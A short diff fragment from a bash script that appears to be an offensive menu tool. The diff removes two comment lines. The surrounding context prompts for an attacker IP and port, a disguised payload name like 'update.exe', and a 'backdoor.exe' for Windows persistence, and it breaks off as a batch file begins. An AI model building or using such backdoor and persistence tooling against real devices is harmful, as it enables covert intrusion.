@@ -23,7 +23,6 @@ if [[ $MAIN_OPTION -eq 1 ]]; then
     echo "[2] Android"
     read -p "Select a device type (1 or 2): " DEVICE_TYPE
     if [[ $DEVICE_TYPE -eq 1 ]]; then
-        # Windows Payload Generation
         read -p "Enter LHOST (Attacker IP): " LHOST
         read -p "Enter LPORT (Listening Port): " LPORT
         read -p "Enter the output payload name (e.g., update.exe): " PAYLOAD_NAME
@@ -131,7 +130,6 @@ elif [[ $MAIN_OPTION -eq 2 ]]; then
     echo "[3] Android Persistence"
     read -p "Select an option (1-3): " PERSIST_OPTION
     if [[ $PERSIST_OPTION -eq 1 ]]; then
-        # Windows Persistence
         read -p "Enter payload name (e.g., backdoor.exe): " PAYLOAD_NAME
         echo "[+] Setting up Windows persistence..."
         cat <<EOF > win_persist.bat
